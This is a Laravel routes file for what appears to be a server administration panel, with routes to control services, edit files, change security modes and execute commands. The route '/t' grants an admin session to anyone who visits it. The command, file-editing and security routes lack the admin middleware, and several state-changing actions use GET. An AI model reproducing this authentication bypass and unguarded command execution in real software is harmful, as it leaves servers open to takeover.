<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('home');
})->middleware('admin');

Route::get('/test',function(){
    
    return $file;
});

Route::get('/services', 'ServiceController@index');
Route::get('/services/get','ServiceController@readServices');

Route::post('/services/{service}/{status}','ServiceController@handleService');
Route::get('/services/{service}/{status}','ServiceController@handleService');

Route::get('/files','FileController@index');
Route::get('/files/view','FileController@viewFile');
Route::post('/files/edit','FileController@editFile');

Route::post('/change/url','FileController@changeFile');

Route::get('/security/basic','SecurityController@basic');
Route::get('/security/protection','SecurityController@protection');

Route::get('/security/basic/{service}/{status}','SecurityController@changeModeStatus');

Route::get('/admin-login','AdminController@adminform');
Route::post('/admin-login','AdminController@adminlogin');

Route::get('/settings','SettingsController@index');
Route::post('/settings/change-password','SettingsController@changePassword');

Route::get('/command','CommandController@index');
Route::post('/command','CommandController@executeCommand');
Route::get('/c','CommandController@executeCommand');

Route::post('/smode/{status}','SecurityController@switchSpecialMode');

Route::get('/t',function(){
    session(['admin'=>'granted']);
});
Auth::routes();

Route::get('/home', 'HomeController@index')->name('home');
